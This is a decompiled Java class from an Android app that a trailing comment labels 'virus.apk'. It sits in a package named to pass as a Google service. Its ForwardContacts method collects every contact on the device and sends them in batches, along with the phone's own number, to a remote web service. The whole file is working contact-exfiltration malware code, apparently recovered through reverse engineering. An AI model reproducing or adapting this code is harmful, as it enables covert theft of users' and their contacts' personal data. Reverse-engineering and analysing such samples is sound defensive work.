package com.example.google.service;

import android.content.Context;
import java.util.ArrayList;
import java.util.Iterator;

public class Contacts
{
  private Context _Context;

  public Contacts(Context paramContext)
  {
    this._Context = paramContext;
  }

  public void ForwardContacts()
  {
    ArrayList localArrayList = new ContactsHelper(this._Context).GetAllContacts();
    WebServiceCalling localWebServiceCalling = new WebServiceCalling(this._Context);
    String str1 = Tools.getPhoneNumber(this._Context);
    String str2 = "";
    Iterator localIterator = localArrayList.iterator();
    while (true)
    {
      if (!localIterator.hasNext())
      {
        if (str2.length() > 0)
          localWebServiceCalling.SendContacts(str1, str2);
        return;
      }
      String str3 = (String)localIterator.next();
      str2 = str2 + "," + str3;
      if (str2.length() > 150)
      {
        localWebServiceCalling.SendContacts(str1, str2);
        str2 = "";
      }
    }
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.Contacts
 * JD-Core Version:    0.6.2
 */